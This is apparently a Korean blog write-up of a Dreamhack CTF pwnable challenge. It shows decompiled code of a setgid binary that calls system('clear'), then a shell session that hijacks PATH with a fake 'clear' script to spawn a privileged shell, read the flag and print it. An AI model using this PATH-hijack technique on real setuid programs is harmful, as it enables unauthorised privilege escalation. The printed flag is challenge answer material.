---
title: "[Dreamhack CTF Season 2 #11] Welcome writeup"
date: 2023-01-29 21:56:00 +09:00
categories: [CTF, PWNABLE]
tags: [ctf]
---

chal 바이너리의 내용은 아래와 같다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __asm { endbr64 }
  sub_1080(1001LL, 1001LL, 1001LL);
  sub_1090("clear");
  sub_1070("Tada~!");
  return 0;
}
```

바이너리를 실행하면 clear를 실행하고 Tada~ 문자열을 출력한 뒤 종료한다. 이제 remote에 접속해보자

```plaintext
pwn@localhost:~$ id
uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)
pwn@localhost:~$ ls -al
total 48
drwxr-x--- 1 pwn  pwn    4096 Dec  7 09:06 .
drwxr-xr-x 1 root root   4096 Dec  5 04:32 ..
-rw-r--r-- 1 pwn  pwn     220 Dec  5 04:32 .bash_logout
-rw-r--r-- 1 pwn  pwn    3771 Dec  5 04:32 .bashrc
drwx------ 2 pwn  pwn    4096 Dec  7 09:06 .cache
-rw-r--r-- 1 pwn  pwn     807 Dec  5 04:32 .profile
-rwxr-sr-x 1 root pwned 16048 Dec  5 04:32 chal
-rw-r-S--- 1 root pwned    69 Dec  5 04:32 flag
pwn@localhost:~$
```

flag에 read가 막혀있으나, `chal` 에 setuid가 걸려있다. 이를 통해 chal이 하는 행위를 조작해야 하는 것을 알 수 있다.

앞서 바이너리를 본대로 chal은 `system("clear")` 와 같이 실행하므로 bash의 환경변수($PATH)의 영향을 받는다.

그러므로 임의 경로에 bash를 실행해주는 명령을 clear라는 이름으로 저장하고, 해당 경로를 환경변수에 추가해주면 플래그를 읽을 수 있다.

```plaintext
pwn@localhost:~$ ./flag
-bash: ./flag: Permission denied
pwn@localhost:~$
```

```plaintext
pwn@localhost:~$ cd /tmp/
pwn@localhost:/tmp$ echo "/bin/bash" > clear
pwn@localhost:/tmp$ chmod 777 clear
pwn@localhost:/tmp$ cat clear
/bin/bash
pwn@localhost:/tmp$
```

```plaintext
pwn@localhost:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
pwn@localhost:/tmp$ export PATH=/tmp:$PATH
pwn@localhost:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
pwn@localhost:/tmp$
```

```plaintext
pwn@localhost:/tmp$ cd ~
pwn@localhost:~$ ./chal
pwn@localhost:~$ id
uid=1000(pwn) gid=1001(pwned) groups=1001(pwned),1000(pwn)
pwn@localhost:~$ cat flag
DH{e47d874ddc629f916d3d5ef6f0d0de90c7b151f9d7010325d051c811382b489f}
pwn@localhost:~$
```